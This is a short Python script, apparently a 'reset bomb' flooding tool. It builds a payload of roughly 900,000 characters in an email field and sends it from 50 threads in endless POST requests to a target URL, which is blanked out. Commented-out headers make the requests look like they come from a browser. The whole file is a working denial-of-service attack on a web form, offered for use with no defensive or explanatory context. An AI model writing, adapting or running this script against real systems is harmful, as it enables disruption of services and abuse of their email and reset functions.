import requests
import threading
import os

url = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
threadsAmount = 50 #adjust if needed

bigtext = ""
#bigtext
for i in range(99999):
    bigtext += "resetbomb"
# print(len(bigtext)) <- i forgot to comment this out earlier
data = { # put data
    "email": f"{bigtext}@resetbomb.com"
}

headers = { # example headers
    #"Host": "xxxxxxxxxxxxxxxxxxxxxxxxxxx",
    #"Cache-Control": "max-age=0",
    #"Accept-Language": "en-US,en;q=0.9",
    #"Origin": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    #"Upgrade-Insecure-Requests": "1",
    #"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    #"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    #"Referer": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    #"Accept-Encoding": "gzip, deflate, br",
    #"Cookie": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx; language=en-EN; dnn_IsMobile=False",
    #"Connection": "keep-alive",
}

iteration = 0
def resetbomb():
    while True:
        response = requests.post(url, data=data, headers=headers)
        print(f"Request {iteration+1} status: {response.status_code}")

threads = []

for i in range(threadsAmount):
    t = threading.Thread(target=resetbomb)
    threads.append(t)
    t.start()
